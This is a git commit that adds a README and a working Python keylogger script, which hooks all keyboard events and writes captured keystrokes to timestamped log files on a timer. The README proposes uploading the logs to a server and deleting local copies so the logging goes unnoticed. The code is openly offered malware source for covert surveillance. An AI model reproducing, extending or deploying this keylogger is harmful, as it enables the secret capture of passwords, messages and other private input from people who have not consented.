ab997c2a244b51fd7160393bbbae193429dd9c94
aliyan110 <aliyanmujahid2000@gmail.com>
2023-03-30 12:44:04 +0500

    posting to github public repo

--- README.md
+++ README.md
@@ -1,2 +1,8 @@
 # KeyLogger_Python
 This repository contains a code to create a keylogger in python that captures key strokes by the user and save them in the local .txt file.
+
+A new file is created once the size of the file reaches to the desired value (1KB in this example)
+
+This program could be used to log the keystrokes ainto a file an upload it to the server once it reaches the specified size while deleting it from local storage and creating a new file to store future logs. in that case the file won't get into notice (less space occupation).
+
+the output from the keystokes lookes smothing like this:
---
+++ keyLogger.py
@@ -0,0 +1,105 @@
+import keyboard # for keylogs
+import sys # for calculating size of logs
+from threading import Timer # Timer is to make a method runs after an `interval` amount of time
+from datetime import datetime
+
+SEND_REPORT_EVERY = 5 * 60 # in seconds
+MAX_FILE_SIZE = 1 * 1024  # in Bytes, adjust as needed
+
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
+
+        if sys.getsizeof(self.log) >= MAX_FILE_SIZE:
+            # if the file size limit is reached, create a new log file
+            self.report()
+
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"logs/{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+        self.start_dt = datetime.now()
+
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+
+            self.report_to_file()
+            # if you don't want to print in the console, comment below line
+            print(f"[{self.filename}] - {self.log}")
+
+            self.start_dt = datetime.now()
+
+        #resetting the log back to zero
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
+
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+
+if __name__ == "__main__":
+
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
